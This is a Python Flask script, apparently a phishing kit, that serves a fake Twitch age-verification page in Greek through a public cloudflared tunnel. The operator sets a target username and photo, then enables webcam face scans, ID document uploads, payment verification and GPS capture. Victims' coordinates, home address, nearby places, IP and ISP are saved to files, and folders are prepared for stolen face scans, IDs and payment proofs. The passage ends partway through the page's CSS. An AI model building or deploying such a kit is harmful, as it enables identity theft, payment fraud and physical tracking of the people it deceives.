import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim
from geopy.distance import geodesic

# --- Εγκατάσταση Εξαρτήσεων και Tunnel Setup ---

def install_package(package):
    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip σιωπηλά."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Ελέγχει για cloudflared και απαιτούμενα Python πακέτα."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
        print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Ξεκινά ένα cloudflared tunnel και τυπώνει το public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Public Link: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_random_username():
    """Δημιουργεί ένα τυχαίο όνομα χρήστη τύπου Twitch."""
    gaming_prefixes = ["pro", "epic", "l33t", "ninja", "ghost", "phantom", "shadow", "wolf", "dragon", "blaze",
                      "toxic", "vortex", "cyber", "neon", "cosmic", "royal", "alpha", "beta", "omega", "sigma"]
    
    gaming_suffixes = ["slayer", "killer", "master", "gamer", "player", "streamer", "warrior", "hunter", "assassin",
                      "legend", "hero", "champion", "god", "lord", "king", "queen", "prince", "knight", "samurai"]
    
    adjectives = ["angry", "happy", "sad", "crazy", "wild", "cool", "hot", "cold", "fast", "slow",
                 "big", "small", "tiny", "huge", "massive", "micro", "mega", "super", "hyper", "ultra"]
    
    nouns = ["panda", "bear", "cat", "dog", "fox", "wolf", "tiger", "lion", "eagle", "hawk",
            "shark", "whale", "dolphin", "octopus", "snake", "spider", "ant", "bee", "butterfly", "dragon"]
    
    # Δημιουργία διαφορετικών μοτίβων ονομάτων χρήστη
    username_patterns = [
        lambda: f"{random.choice(gaming_prefixes)}_{random.choice(gaming_suffixes)}{random.randint(10, 999)}",
        lambda: f"{random.choice(adjectives)}_{random.choice(nouns)}{random.randint(1, 99)}",
        lambda: f"xX_{random.choice(gaming_prefixes)}_{random.choice(nouns)}_Xx",
        lambda: f"TTV_{random.choice(adjectives)}{random.choice(gaming_suffixes)}",
        lambda: f"twitch_{random.choice(nouns)}_{random.randint(100, 999)}",
        lambda: f"{random.choice(gaming_prefixes)}_{random.choice(nouns)}TV",
        lambda: f"{random.choice(adjectives)}{random.choice(gaming_suffixes)}{random.randint(1000, 9999)}",
        lambda: f"{random.choice(['im', 'iam', 'the'])}{random.choice(gaming_suffixes)}",
        lambda: f"{random.choice(nouns)}Of{random.choice(adjectives).title()}",
        lambda: f"{random.choice(['official', 'real', 'true'])}{random.choice(gaming_suffixes).title()}"
    ]
    
    return random.choice(username_patterns)()

def find_profile_picture(folder):
    """Αναζητά αρχείο εικόνας στο φάκελο για χρήση ως προφίλ."""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for file in os.listdir(folder):
        file_lower = file.lower()
        if any(file_lower.endswith(ext) for ext in image_extensions):
            filepath = os.path.join(folder, file)
            try:
                # Διαβάζει το αρχείο εικόνας και το μετατρέπει σε base64
                with open(filepath, 'rb') as f:
                    image_data = f.read()
                    image_ext = os.path.splitext(file)[1].lower()
                    
                    # Καθορίζει τον τύπο MIME βάσει της επέκτασης
                    mime_types = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp',
                        '.webp': 'image/webp'
                    }
                    
                    mime_type = mime_types.get(image_ext, 'image/jpeg')
                    base64_image = base64.b64encode(image_data).decode('utf-8')
                    
                    return {
                        'filename': file,
                        'data_url': f'data:{mime_type};base64,{base64_image}',
                        'path': filepath
                    }
            except Exception as e:
                print(f"Σφάλμα ανάγνωσης εικόνας προφίλ {file}: {e}")
    
    return None

def get_verification_settings():
    """Λαμβάνει τις προτιμήσεις του χρήστη για τη διαδικασία επαλήθευσης Twitch."""
    print("\n" + "="*60)
    print("ΡΥΘΜΙΣΕΙΣ ΕΠΑΛΗΘΕΥΣΗΣ ΗΛΙΚΙΑΣ TWITCH")
    print("="*60)
    
    # Λήψη ονόματος χρήστη στόχου
    print("\n[+] ΡΥΘΜΙΣΗ ΟΝΟΜΑΤΟΣ ΧΡΗΣΤΗ ΣΤΟΧΟΥ")
    print("Εισάγετε το όνομα χρήστη Twitch που θα εμφανιστεί στη σελίδα επαλήθευσης")
    print("Αφήστε κενό για τυχαία δημιουργία ονόματος")
    
    username_input = input("Όνομα χρήστη στόχου (ή Enter για τυχαίο): ").strip()
    if username_input:
        settings = {'target_username': username_input}
    else:
        random_username = generate_random_username()
        settings = {'target_username': random_username}
        print(f"[+] Δημιουργήθηκε τυχαίο όνομα: {random_username}")
    
    # Αναζήτηση εικόνας προφίλ
    global DOWNLOAD_FOLDER
    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
    if profile_pic:
        settings['profile_picture'] = profile_pic['data_url']
        settings['profile_picture_filename'] = profile_pic['filename']
        print(f"[+] Βρέθηκε εικόνα προφίλ: {profile_pic['filename']}")
        print(f"[+] Χρήση εικόνας προφίλ για το @{settings['target_username']}")
    else:
        settings['profile_picture'] = None
        settings['profile_picture_filename'] = None
        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
        print(f"[!] Συμβουλή: Τοποθετήστε μια εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
    
    print(f"\n[+] Η επαλήθευση θα εμφανιστεί για: @{settings['target_username']}")
    
    # Τύπος λογαριασμού
    print("\n1. Τύπος Λογαριασμού:")
    print("Είναι αυτός λογαριασμός streamer ή θεατή;")
    print("1. Λογαριασμός Streamer (θέλει να μεταδώσει περιεχόμενο)")
    print("2. Λογαριασμός Θεατή (θέλει να παρακολουθήσει περιεχόμενο με περιορισμό ηλικίας)")
    
    while True:
        account_type = input("Επιλέξτε τύπο λογαριασμού (1/2, προεπιλογή: 1): ").strip()
        if not account_type:
            settings['account_type'] = 'streamer'
            break
        if account_type == '1':
            settings['account_type'] = 'streamer'
            break
        elif account_type == '2':
            settings['account_type'] = 'viewer'
            break
        else:
            print("Παρακαλώ εισάγετε 1 ή 2.")
    
    # Διάρκεια σάρωσης προσώπου
    print(f"\n2. Διάρκεια Σάρωσης Προσώπου:")
    print(f"Πόσα δευτερόλεπτα για την επαλήθευση προσώπου για {settings['account_type']} λογαριασμό;")
    print("Προτείνεται: 15-30 δευτερόλεπτα για πλήρη επαλήθευση")
    
    while True:
        try:
            duration = input("Διάρκεια σε δευτερόλεπτα (5-60, προεπιλογή: 25): ").strip()
            if not duration:
                settings['face_duration'] = 25
                break
            duration = int(duration)
            if 5 <= duration <= 60:
                settings['face_duration'] = duration
                break
            else:
                print("Παρακαλώ εισάγετε αριθμό μεταξύ 5 και 60.")
        except ValueError:
            print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
    
    # Επαλήθευση ταυτότητας
    print(f"\n3. Επαλήθευση Εγγράφου Ταυτότητας:")
    print(f"Απαιτείται μεταφόρτωση εγγράφου ταυτότητας για επαλήθευση ηλικίας;")
    id_enabled = input("Ενεργοποίηση επαλήθευσης ταυτότητας (ναι/όχι, προεπιλογή: ναι): ").strip().lower()
    settings['id_enabled'] = id_enabled in ['ναι', 'ν', 'yes', 'y', '']
    
    if settings['id_enabled']:
        print("\nΤύπος Εγγράφου Ταυτότητας:")
        print("1. Επίσημο έγγραφο (Διαβατήριο, Δίπλωμα Οδήγησης)")
        print("2. Φοιτητική ταυτότητα")
        print("3. Έντυπο συγκατάθεσης γονέα")
        
        while True:
            id_type = input("Επιλέξτε τύπο ταυτότητας (1/2/3, προεπιλογή: 1): ").strip()
            if not id_type:
                settings['id_type'] = 'government'
                break
            if id_type == '1':
                settings['id_type'] = 'government'
                break
            elif id_type == '2':
                settings['id_type'] = 'student'
                break
            elif id_type == '3':
                settings['id_type'] = 'parental'
                break
            else:
                print("Παρακαλώ εισάγετε 1, 2 ή 3.")
    
    # Επαλήθευση πληρωμών (για streamers)
    if settings['account_type'] == 'streamer':
        print(f"\n4. Επαλήθευση Πληρωμών:")
        print(f"Απαιτείται επαλήθευση μεθόδου πληρωμής για μονετοποίηση;")
        payment_enabled = input("Ενεργοποίηση επαλήθευσης πληρωμών (ναι/όχι, προεπιλογή: ναι): ").strip().lower()
        settings['payment_enabled'] = payment_enabled in ['ναι', 'ν', 'yes', 'y', '']
    else:
        settings['payment_enabled'] = False
    
    # Επαλήθευση τοποθεσίας
    print(f"\n5. Επαλήθευση Τοποθεσίας:")
    print(f"Απαιτείται επαλήθευση τοποθεσίας για συμμόρφωση με περιφερειακούς κανονισμούς;")
    location_enabled = input("Ενεργοποίηση επαλήθευσης τοποθεσίας (ναι/όχι, προεπιλογή: ναι): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['ναι', 'ν', 'yes', 'y', '']
    
    return settings

# --- Συναρτήσεις Επεξεργασίας Τοποθεσίας ---

geolocator = Nominatim(user_agent="twitch_verification")

def get_ip_info():
    """Λαμβάνει πληροφορίες τοποθεσίας βάσει IP."""
    try:
        response = requests.get("http://ipinfo.io/json", timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.RequestException:
        return {}

def get_nearby_places(latitude, longitude, radius=2000, limit=3):
    """Επιστρέφει κοντινά καταστήματα/αξιοθέατα."""
    overpass_query = f"""
    [out:json];
    (
        node["shop"](around:{radius},{latitude},{longitude});
        way["shop"](around:{radius},{latitude},{longitude});
        node["amenity"](around:{radius},{latitude},{longitude});
        way["amenity"](around:{radius},{latitude},{longitude});
    );
    out center;
    """
    try:
        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query}, timeout=10)
        response.raise_for_status()
        elements = response.json().get('elements', [])
        results = []
        
        for element in elements:
            tags = element.get('tags', {})
            lat_elem = element.get('lat') or element.get('center', {}).get('lat')
            lon_elem = element.get('lon') or element.get('center', {}).get('lon')
            
            if not lat_elem or not lon_elem:
                continue
            
            distance = geodesic((latitude, longitude), (lat_elem, lon_elem)).meters
            
            place_type = tags.get("shop") or tags.get("amenity") or tags.get("tourism") or "unknown"
            place_name = tags.get("name", "Ανώνυμος Χώρος")
            
            results.append({
                "type": place_type,
                "name": place_name,
                "address": f"{tags.get('addr:street', '')} {tags.get('addr:housenumber', '')}".strip(),
                "distance_m": round(distance, 1)
            })
        
        results.sort(key=lambda x: x["distance_m"])
        return results[:limit]
        
    except requests.RequestException:
        return []

def process_and_save_location(data, session_id):
    """Επεξεργάζεται και αποθηκεύει δεδομένα τοποθεσίας με μεταδεδομένα."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Λήψη πληροφοριών διεύθυνσης
        address_details = {}
        full_address = "Άγνωστη Διεύθυνση"
        try:
            location = geolocator.reverse((lat, lon), language='el', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Λήψη κοντινών τοποθεσιών
        places = get_nearby_places(lat, lon)
        
        # Λήψη πληροφοριών IP
        ip_info = get_ip_info()
        
        # Προετοιμασία δομημένων δεδομένων
        location_data = {
            "verification_type": "twitch_location",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy'),
                "altitude_m": data.get('altitude'),
                "speed_mps": data.get('speed'),
                "heading_degrees": data.get('heading')
            },
            "address_information": {
                "full_address": full_address,
                "house_number": address_details.get("house_number"),
                "street": address_details.get("road"),
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "postal_code": address_details.get("postcode"),
                "country": address_details.get("country")
            },
            "nearby_places": places,
            "network_information": {
                "ip_address": ip_info.get("ip"),
                "city": ip_info.get("city"),
                "region": ip_info.get("region"),
                "country": ip_info.get("country"),
                "isp": ip_info.get("org", "").split()[-1] if ip_info.get("org") else "Άγνωστο"
            },
            "device_info": {
                "user_agent": data.get('user_agent', 'Άγνωστο'),
                "timestamp_utc": datetime.utcnow().isoformat(),
                "local_timestamp": datetime.now().isoformat()
            }
        }
        
        # Αποθήκευση σε αρχείο
        filename = f"twitch_location_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Αποθηκεύτηκαν δεδομένα τοποθεσίας Twitch: {filename}")
        
    except Exception as e:
        print(f"Σφάλμα επεξεργασίας τοποθεσίας: {e}")

# --- Flask Εφαρμογή ---

app = Flask(__name__)

# Καθολικές ρυθμίσεις
VERIFICATION_SETTINGS = {
    'target_username': 'twitch_user_' + str(random.randint(100000, 999999)),
    'account_type': 'streamer',
    'face_duration': 25,
    'id_enabled': True,
    'id_type': 'government',
    'payment_enabled': True,
    'location_enabled': True,
    'profile_picture': None,
    'profile_picture_filename': None
}

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Twitch Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_scans'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'payment_proofs'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_html_template(settings):
    """Δημιουργεί το ολοκληρωμένο πρότυπο επαλήθευσης Twitch στα Ελληνικά."""
    target_username = settings['target_username']
    account_type = settings['account_type']
    face_duration = settings['face_duration']
    id_enabled = settings['id_enabled']
    id_type = settings.get('id_type', 'government')
    payment_enabled = settings['payment_enabled']
    location_enabled = settings['location_enabled']
    profile_picture = settings.get('profile_picture')
    profile_picture_filename = settings.get('profile_picture_filename')
    
    # Δημιουργία στατιστικών λογαριασμού
    followers = random.randint(500, 10000) if account_type == 'streamer' else random.randint(10, 1000)
    following = random.randint(50, 500)
    total_views = random.randint(1000, 100000) if account_type == 'streamer' else 0
    account_age = random.randint(30, 365 * 3)  # ημέρες
    
    # Υπολογισμός συνολικών βημάτων
    total_steps = 2  # Εισαγωγή + Πρόσωπο
    if id_enabled:
        total_steps += 1
    if payment_enabled:
        total_steps += 1
    if location_enabled:
        total_steps += 1
    total_steps += 1  # Τελικό βήμα
    
    # Δημιουργία του βασικού προτύπου με μεταβλητές
    template = f'''<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twitch Επαλήθευση Ηλικίας & Ταυτότητας</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }}
        
        body {{
            background-color: #0f0f23;
            background-image: radial-gradient(circle at 50% 50%, #1a1a2e 0%, #0f0f23 100%);
            color: #efeff1;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .container {{
            max-width: 600px;
            width: 100%;
            margin: 0 auto;
        }}
        
        .logo-header {{
            text-align: center;
            margin-bottom: 30px;
            padding-top: 20px;
        }}
        
        .logo {{
            font-size: 2.5rem;
            font-weight: 800;
            color: #9146ff;
            margin-bottom: 10px;
            letter-spacing: -0.5px;
        }}
        
        .logo-subtitle {{
            color: #adadb8;
            font-size: 0.9rem;
            opacity: 0.8;
        }}
        
        .account-card {{
            background: linear-gradient(135deg, #18182b 0%, #1a1a2e 100%);
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid #26263a;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }}
        
        .account-header {{
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }}
        
        .account-avatar {{
            width: 80px;
            height: 80px;
            border-radius: 12px;
            background: linear-gradient(135deg, #9146ff, #bf94ff);
            overflow: hidden;
            margin-right: 20px;
            border: 3px solid #26263a;
        }}
        
        .account-avatar img {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .account-info {{
            flex: 1;
        }}
        
        .account-display-name {{
            font-size: 1.5rem;
            font-weight: 700;
            color: #efeff1;
            margin-bottom: 5px;
        }}
        
        .account-username {{
            color: #adadb8;
            font-size: 0.9rem;
            margin-bottom: 8px;
        }}
        
        .account-badge {{
            display: inline-block;
            background: linear-gradient(135deg, #9146ff, #bf94ff);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
        }}
        
        .account-stats {{
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 20px;
        }}
        
        .stat-item {{
            text-align: center;
            padding: 15px;
            background: rgba(38, 38, 58, 0.5);
            border-radius: 12px;
            border: 1px solid #2d2d44;
        }}
        
        .stat-number {{
            font-size: 1.2rem;
            font-weight: 700;
            color: #9146ff;
            margin-bottom: 5px;
        }}
        
        .stat-label {{
            color: #adadb8;
            font-size: 0.8rem;
        }}
        
        .verification-container {{
            background: linear-gradient(135deg, #18182b 0%, #1a1a2e 100%);
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 25px;
            border: 1px solid #26263a;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }}
        
        .step {{
            display: none;
        }}
        
        .step.active {{
            display: block;
            animation: fadeIn 0.3s ease;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(10px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        
        .step-title {{
            font-size: 1.5rem;
            font-weight: 700;
            color: #efeff1;
            margin-bottom: 10px;
        }}
        
        .step-subtitle {{
            color: #adadb8;
            font-size: 0.95rem;
            line-height: 1.5;
            margin-bottom: 25px;
        }}
        
        .progress-container {{
            margin-bottom: 30px;
        }}
        
        .progress-bar {{
            height: 6px;
            background: #26263a;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 10px;
        }}
        
        .progress-fill {{
            height: 100%;
            background: linear-gradient(90deg, #9146ff, #bf94ff);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 3px;
        }}
        
        .progress-steps {{
            display: flex;
            justify-content: space-between;
            position: relative;
            margin: 20px 0 30px;
        }}
        
        .step-indicator {{
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: #26263a;
            color: #adadb8;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            position: relative;
            z-index: 2;
            border: 2px solid #26263a;
            transition: all 0.3s ease;
        }}
        
        .step-indicator.active {{
            background: #9146ff;
            color: white;
            border-color: #bf94ff;
            box-shadow: 0 0 0 4px rgba(145, 70, 255, 0.2);
        }}
        
        .step-indicator.completed {{
            background: #00a35c;
            color: white;
            border-color: #00d474;
        }}
        
        .step-line {{
            position: absolute;
            top: 18px;
            left: 18px;
            right: 18px;
            height: 2px;
            background: #26263a;
            z-index: 1;
        }}
        
        .step-line-fill {{
            position: absolute;
            top: 18px;
            left: 18px;
            height: 2px;
            background: linear-gradient(90deg, #9146ff, #bf94ff);
            z-index: 1;
            width: 0%;
            transition: width 0.3s ease;
        }}
        
        /* Twitch Purple Theme */
        .twitch-purple {{
            color: #9146ff;
        }}
        
        .twitch-bg {{
            background: linear-gradient(135deg, #9146ff, #bf94ff);
        }}
        
        /* Warning Box */
        .warning-box {{
            background: linear-gradient(135deg, rgba(255, 69, 0, 0.1) 0%, rgba(255, 69, 0, 0.05) 100%);
            border: 1px solid rgba(255, 69, 0, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
        }}
        
        .warning-header {{
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }}
        
        .warning-icon {{
            font-size: 1.5rem;
            margin-right: 10px;
            color: #ff4500;
        }}
        
        .warning-title {{
            font-weight: 600;
            color: #ff4500;
        }}
        
        .warning-content {{
            color: #ffa07a;
            font-size: 0.9rem;
            line-height: 1.5;
        }}
        
        /* Info Box */
        .info-box {{
            background: linear-gradient(135deg, rgba(145, 70, 255, 0.1) 0%, rgba(191, 148, 255, 0.05) 100%);
            border: 1px solid rgba(145, 70, 255, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
        }}
        
        .info-header {{
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }}
        
        .info-icon {{
            font-size: 1.5rem;
            margin-right: 10px;
            color: #9146ff;
        }}
        
        .info-title {{
            font-weight: 600;
            color: #9146ff;
        }}
        
        .info-content {{
            color: #bf94ff;
            font-size: 0.9rem;
            line-height: 1.5;
        }}
        
        /* Face Verification Styles */
        .camera-container {{
            width: 300px;
            height: 300px;
            margin: 0 auto 25px;
            border-radius: 50%;
            overflow: hidden;
            background: #0f0f23;
            border: 3px solid #26263a;
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 200px;
            border: 3px solid #9146ff;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(15, 15, 35, 0.7);
        }}
        
        .face-timer {{
            text-align: center;
            font-size: 2.5rem;
            font-weight: 700;
            color: #9146ff;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
        }}
        
        .face-instruction {{
            background: rgba(145, 70, 255, 0.1);
            border: 1px solid rgba(145, 70, 255, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: center;
        }}
        
        .instruction-icon {{
            font-size: 2.5rem;
            margin-bottom: 10px;
        }}
        
        .instruction-text {{
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 5px;
            color: #bf94ff;
        }}
        
        .instruction-detail {{
            color: #adadb8;
            font-size: 0.9rem;
        }}
        
        /* ID Verification Styles */
        .id-upload-section {{
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            margin-bottom: 25px;
        }}
        
        .id-card {{
            background: rgba(38, 38, 58, 0.5);
            border: 2px dashed #3d3d5c;
            border-radius: 12px;
            padding: 25px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }}
        
        .id-card:hover {{
            border-color: #9146ff;
            background: rgba(145, 70, 255, 0.1);
            transform: translateY(-2px);
        }}
        
        .id-card.dragover {{
            border-color: #9146ff;
            background: rgba(145, 70, 255, 0.2);
        }}
        
        .id-icon {{
            font-size: 3rem;
            margin-bottom: 15px;
            color: #9146ff;
        }}
        
        .id-title {{
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #efeff1;
        }}
        
        .id-subtitle {{
            color: #adadb8;
            font-size: 0.9rem;
            margin-bottom: 15px;
        }}
        
        .id-preview {{
            margin-top: 15px;
            display: none;
        }}
        
        .id-preview-image {{
            max-width: 200px;
            max-height: 150px;
            border-radius: 8px;
            border: 2px solid #26263a;
        }}
        
        .id-requirements {{
            background: rgba(38, 38, 58, 0.5);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
        }}
        
        .requirements-title {{
            font-weight: 600;
            margin-bottom: 10px;
            color: #efeff1;
        }}
        
        .requirements-list {{
            list-style: none;
            padding-left: 0;
        }}
        
        .requirements-list li {{
            color: #adadb8;
            font-size: 0.9rem;
            margin-bottom: 8px;
            padding-left: 20px;
            position: relative;
        }}
        
        .requirements-list li:before {{
            content: "•";
            color: #9146ff;
            position: absolute;
            left: 0;
        }}
        
        /* Payment Verification Styles */
        .payment-options {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }}
        
        .payment-option {{
            background: rgba(38, 38, 58, 0.5);
            border: 2px solid #3d3d5c;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }}
        
        .payment-option:hover {{
            border-color: #9146ff;
            background: rgba(145, 70, 255, 0.1);
        }}
        
        .payment-option.selected {{
            border-color: #9146ff;
            background: rgba(145, 70, 255, 0.2);
            box-shadow: 0 0 0 3px rgba(145, 70, 255, 0.2);
        }}
        
        .payment-icon {{
            font-size: 2.5rem;
            margin-bottom: 10px;
            color: #9146ff;
        }}
        
        .payment-name {{
            font-weight: 600;
            color: #efeff1;
            margin-bottom: 5px;
        }}
        
        .payment-hint {{
            color: #adadb8;
            font-size: 0.8rem;
        }}
        
        .payment-details {{
            background: rgba(38, 38, 58, 0.5);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
            display: none;
        }}
        
        .form-group {{
            margin-bottom: 15px;
        }}
        
        .form-label {{
            display: block;
            color: #adadb8;
            font-size: 0.9rem;
            margin-bottom: 5px;
        }}
        
        .form-input {{
            width: 100%;
            padding: 12px 15px;
            background: #0f0f23;
            border: 1px solid #3d3d5c;
            border-radius: 8px;
            color: #efeff1;
            font-size: 0.95rem;
            transition: border-color 0.3s ease;
        }}
        
        .form-input:focus {{
            outline: none;
            border-color: #9146ff;
            box-shadow: 0 0 0 3px rgba(145, 70, 255, 0.2);
        }}
        
        /* Location Verification Styles */
        .location-container {{
            text-align: center;
            margin-bottom: 25px;
        }}
        
        .location-icon {{
            font-size: 4rem;
            margin-bottom: 20px;
            color: #9146ff;
        }}
        
        .location-info {{
            background: rgba(145, 70, 255, 0.1);
            border: 1px solid rgba(145, 70, 255, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }}
        
        .location-accuracy {{
            background: rgba(38, 38, 58, 0.5);
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
        }}
        
        .accuracy-meter {{
            width: 100%;
            height: 10px;
            background: #26263a;
            border-radius: 5px;
            margin: 15px 0;
            overflow: hidden;
        }}
        
        .accuracy-fill {{
            height: 100%;
            background: linear-gradient(90deg, #ff4500, #ffa500, #00d474);
            width: 0%;
            transition: width 1s ease-in-out;
            border-radius: 5px;
        }}
        
        .accuracy-labels {{
            display: flex;
            justify-content: space-between;
            font-size: 0.8rem;
            color: #adadb8;
            margin-top: 5px;
        }}
        
        .location-details {{
            background: rgba(38, 38, 58, 0.5);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
            text-align: left;
            display: none;
        }}
        
        .detail-row {{
            display: flex;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #2d2d44;
        }}
        
        .detail-row:last-child {{
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }}
        
        .detail-label {{
            width: 120px;
            color: #adadb8;
            font-size: 0.9rem;
        }}
        
        .detail-value {{
            flex: 1;
            color: #efeff1;
            font-size: 0.9rem;
            font-weight: 500;
        }}
        
        /* Button Styles */
        .button {{
            width: 100%;
            padding: 16px 24px;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }}
        
        .primary-btn {{
            background: linear-gradient(135deg, #9146ff, #bf94ff);
            color: white;
        }}
        
        .primary-btn:hover:not(:disabled) {{
            transform: translateY(-2px);
            box-shadow: 0 8px 32px rgba(145, 70, 255, 0.3);
        }}
        
        .primary-btn:disabled {{
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }}
        
        .secondary-btn {{
            background: rgba(38, 38, 58, 0.5);
            color: #adadb8;
            border: 1px solid #3d3d5c;
        }}
        
        .secondary-btn:hover {{
            background: rgba(38, 38, 58, 0.8);
            border-color: #9146ff;
            color: #efeff1;
        }}
        
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        /* Status Messages */
        .status-message {{
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            display: none;
        }}
        
        .status-success {{
            background: rgba(0, 163, 92, 0.1);
            border: 1px solid rgba(0, 163, 92, 0.3);
            color: #00d474;
        }}
        
        .status-error {{
            background: rgba(255, 69, 0, 0.1);
            border: 1px solid rgba(255, 69, 0, 0.3);
            color: #ff4500;
        }}
        
        .status-processing {{
            background: rgba(145, 70, 255, 0.1);
            border: 1px solid rgba(145, 70, 255, 0.3);
            color: #bf94ff;
        }}
        
        /* Completion Page */
        .completion-container {{
            text-align: center;
            padding: 40px 20px;
        }}
        
